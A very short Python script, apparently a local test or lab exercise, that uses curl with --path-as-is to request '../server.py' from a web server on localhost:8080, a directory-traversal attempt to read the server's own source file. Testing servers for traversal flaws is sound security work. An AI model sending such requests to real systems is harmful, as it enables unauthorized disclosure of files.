import os

print("Trying to get the webserver file : ")
os.system('curl --path-as-is http://localhost:8080/../server.py')
